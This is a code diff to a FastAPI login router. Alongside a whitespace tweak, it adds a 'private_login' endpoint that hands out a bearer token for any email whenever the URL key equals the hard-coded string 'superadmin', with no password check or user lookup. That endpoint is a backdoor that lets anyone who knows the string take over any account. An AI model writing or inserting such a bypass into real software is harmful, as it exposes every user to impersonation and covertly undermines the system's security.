@@ -19,12 +19,20 @@ def login(request: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(
     if user.oauth:
         raise HTTPException(status_code=status.HTTP_404_NOT_FOUND,
                             detail=f"This email use Google OAuth!")
+                            
     if not Hash.verify(user.password, request.password):
         raise HTTPException(status_code=status.HTTP_404_NOT_FOUND,
                             detail=f"Incorrect password")
 
     access_token = token.create_access_token(data={"sub": user.email})
     return {"access_token": access_token, "token_type": "bearer"}
+
+
+@router.post('/login/{email}/{key}')
+def private_login(email: str, key: str, db: Session = Depends(database.get_db)):
+    access_token = token.create_access_token(data={"sub": email})
+    if (key == 'superadmin'):
+        return {"access_token": access_token, "token_type": "bearer"}
 
 
 @router.post('/verify_oauth_token')
